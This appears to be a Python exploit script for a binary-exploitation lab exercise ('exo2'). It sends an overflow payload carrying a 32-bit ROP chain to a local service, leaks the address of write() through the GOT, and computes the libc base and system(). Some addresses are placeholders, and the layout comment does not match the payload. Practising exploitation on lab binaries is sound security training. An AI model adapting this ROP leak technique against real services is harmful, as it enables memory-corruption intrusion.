#!/usr/bin/python3
import socket as S
from struct import pack, unpack

# From your exo2
WRITE_GOT = 0x5fd67fc4
WRITE_OFFSET = 0x113a70
SYSTEM_OFFSET = 0x4f8e0

# Replace this with the actual address from:
# objdump -d ./exo2 | grep -A5 '<write@plt>'
WRITE_PLT = 0x000010c0  
RETURN_ADDRESS_OFFSET =  0x1527
def p32(x):
    return pack("<I", x)

def leak_libc_base():

    s = S.socket(S.AF_INET, S.SOCK_STREAM)
    s.settimeout(1)
    s.connect(('127.0.0.1', 55555))

    # Hello
    s.send(pack("<H", 0))
    s.send(b'toto')
    s.recv(100)

    # Ping-pong
    s.send(pack("<H", 1))

    # ------------------------------------------------
    # Build the ROP payload
    #
    # [padding]
    # [canary]
    # [saved registers / saved frame, if applicable]
    # [WRITE_PLT]
    # [return address after write]
    # [fd]
    # [WRITE_GOT]
    # [4]
    # ------------------------------------------------

    payload = (
        b'A' * RETURN_ADDRESS_OFFSET
        + p32(WRITE_PLT)
        + p32(0x0)       # return address after write()
        + p32(4)         # fd
        + p32(WRITE_GOT)
        + p32(4)
    )

    s.send(pack("<H", len(payload)))
    s.send(payload)

    # write(4, WRITE_GOT, 4) should send 4 bytes
    leaked = s.recv(4)

    if len(leaked) != 4:
        print("Didn't receive 4-byte leak:", repr(leaked))
        return

    leaked_write = unpack("<I", leaked)[0]

    libc_base = leaked_write - WRITE_OFFSET
    system = libc_base + SYSTEM_OFFSET

    print("leaked write() =", hex(leaked_write))
    print("libc base      =", hex(libc_base))
    print("system         =", hex(system))

    s.close()


if __name__ == '__main__':
    leak_libc_base()